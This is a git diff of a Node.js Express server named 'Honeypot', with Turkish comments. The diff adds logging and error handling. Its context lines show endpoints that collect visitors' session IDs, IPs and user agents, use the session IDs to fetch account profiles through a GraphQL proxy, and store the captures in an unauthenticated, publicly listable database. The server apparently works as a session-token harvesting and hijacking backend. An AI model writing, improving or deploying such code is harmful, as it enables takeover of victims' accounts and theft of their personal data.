@@ -29,16 +29,25 @@ db.serialize(() => {
       updated_at DATETIME DEFAULT CURRENT_TIMESTAMP
     )
   `);
+  console.log('✅ Database initialized');
 });
 
-// ---- STATİK DOSYALAR ----
-app.use(express.static(path.join(__dirname, '/')));
+// ---- MIDDLEWARE ----
 app.use(express.json());
 app.use(cors({ origin: '*', credentials: true }));
 
-// ---- ANA SAYFA - (404 hatasını düzeltir) ----
+// ---- STATİK DOSYALAR (index.html için) ----
+app.use(express.static(path.join(__dirname)));
+
+// ---- ANA SAYFA - manuel olarak index.html gönder ----
 app.get('/', (req, res) => {
-  res.sendFile(path.join(__dirname, 'index.html'));
+  const indexPath = path.join(__dirname, 'index.html');
+  res.sendFile(indexPath, (err) => {
+    if (err) {
+      console.error('❌ index.html not found at:', indexPath);
+      res.status(404).send('index.html not found');
+    }
+  });
 });
 
 // ---- RATE LİMİT ----
@@ -70,6 +79,7 @@ function saveSession(sessionId, profileData, ip, userAgent) {
 app.get('/sessions', (req, res) => {
   db.all('SELECT * FROM sessions ORDER BY updated_at DESC', (err, rows) => {
     if (err) {
+      console.error('❌ DB error:', err.message);
       res.status(500).json({ error: err.message });
     } else {
       res.json(rows);
@@ -91,9 +101,9 @@ app.post('/collect', async (req, res) => {
     const profile = await fetchProfile(sessionId);
     await saveSession(sessionId, profile, ip, userAgent);
     console.log(`✅ Honeypot captured: @${profile.username} from ${ip}`);
-    res.json({ success: true });
+    res.json({ success: true, profile });
   } catch (err) {
-    console.log('❌ Capture failed:', err.message);
+    console.error('❌ Capture failed:', err.message);
     res.status(500).json({ error: err.message });
   }
 });
@@ -128,7 +138,7 @@ app.post('/graphql', async (req, res) => {
         await saveSession(sessionId, data.data.user, ip, ua);
         console.log('✅ Session saved to database');
       } catch (dbErr) {
-        console.log('⚠️ DB save error:', dbErr.message);
+        console.error('⚠️ DB save error:', dbErr.message);
       }
     }
     
@@ -136,6 +146,7 @@ app.post('/graphql', async (req, res) => {
     console.log(`[${hash}] Query: ${query.slice(0,30)}... Status: ${response.status}`);
     res.status(response.status).json(data);
   } catch (err) {
+    console.error('❌ GraphQL error:', err.message);
     res.status(500).json({ error: err.message });
   }
 });
@@ -157,12 +168,26 @@ async function fetchProfile(sessionId) {
     body: JSON.stringify({ query: PROFILE_QUERY, variables: { id: sessionId } }),
     timeout: 10000
   });
+  
+  if (!response.ok) {
+    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+  }
+  
   const data = await response.json();
-  if (data.errors) throw new Error(data.errors[0].message);
+  if (data.errors) {
+    throw new Error(data.errors.map(e => e.message).join(', '));
+  }
+  if (!data.data || !data.data.user) {
+    throw new Error('No user data returned');
+  }
   return data.data.user;
 }
 
 app.get('/ping', (req, res) => res.json({ ok: true, timestamp: Date.now() }));
 
 // ---- SERVER BAŞLAT ----
-app.listen(process.env.PORT || 3000, () => console.log('✅ Honeypot running on port ' + (process.env.PORT || 3000)));
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => {
+  console.log(`✅ Honeypot running on port ${PORT}`);
+  console.log(`📊 Sessions: http://localhost:${PORT}/sessions`);
+});
